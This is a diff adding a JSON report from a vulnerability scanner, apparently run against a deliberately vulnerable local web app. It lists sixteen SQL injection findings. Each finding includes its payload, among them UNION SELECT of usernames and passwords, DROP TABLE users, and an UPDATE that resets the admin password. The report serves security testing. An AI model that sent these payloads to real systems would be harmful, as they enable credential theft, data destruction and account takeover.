@@ -1,0 +1,175 @@
+{
+  "scan_id": "scan_1773588471",
+  "status": "COMPLETED",
+  "target_url": "http://localhost:45/index.php",
+  "start_time": 1773588474.3529987,
+  "end_time": 1773588486.8909972,
+  "elapsed_time": 12.53799843788147,
+  "pages_crawled": 15,
+  "vulnerabilities_found": 16,
+  "vulnerabilities": [
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=2.+%3B+DROP+TABLE+users%3B&Submit=Submit",
+      "parameter": "id",
+      "payload": "2. ; DROP TABLE users;",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=4.+ORDER+BY+1--&Submit=Submit",
+      "parameter": "id",
+      "payload": "4. ORDER BY 1--",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=%27&Submit=Submit",
+      "parameter": "id",
+      "payload": "'",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=1%27+UNION+SELECT+null--&Submit=Submit",
+      "parameter": "id",
+      "payload": "1' UNION SELECT null--",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=5.+UPDATE+users+SET+password%3D%27hack123%27+WHERE+username%3D%27admin%27&Submit=Submit",
+      "parameter": "id",
+      "payload": "5. UPDATE users SET password='hack123' WHERE username='admin'",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=3.+UNION+ALL+SELECT+username%2C+password+FROM+users&Submit=Submit",
+      "parameter": "id",
+      "payload": "3. UNION ALL SELECT username, password FROM users",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=1.+%27+OR+%271%27%3D%271&Submit=Submit",
+      "parameter": "id",
+      "payload": "1. ' OR '1'='1",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in id parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=%27+OR+%271%27%3D%271",
+      "parameter": "Submit",
+      "payload": "' OR '1'='1",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=2.+%3B+DROP+TABLE+users%3B",
+      "parameter": "Submit",
+      "payload": "2. ; DROP TABLE users;",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=4.+ORDER+BY+1--",
+      "parameter": "Submit",
+      "payload": "4. ORDER BY 1--",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=%27",
+      "parameter": "Submit",
+      "payload": "'",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=1%27+UNION+SELECT+null--",
+      "parameter": "Submit",
+      "payload": "1' UNION SELECT null--",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=5.+UPDATE+users+SET+password%3D%27hack123%27+WHERE+username%3D%27admin%27",
+      "parameter": "Submit",
+      "payload": "5. UPDATE users SET password='hack123' WHERE username='admin'",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=3.+UNION+ALL+SELECT+username%2C+password+FROM+users",
+      "parameter": "Submit",
+      "payload": "3. UNION ALL SELECT username, password FROM users",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/sqli/?id=&Submit=1.+%27+OR+%271%27%3D%271",
+      "parameter": "Submit",
+      "payload": "1. ' OR '1'='1",
+      "method": "GET",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    }
+  ],
+  "report_generated": "2026-03-15T20:58:06.898119",
+  "report_version": "1.0.0",
+  "report_format": "json"
+}
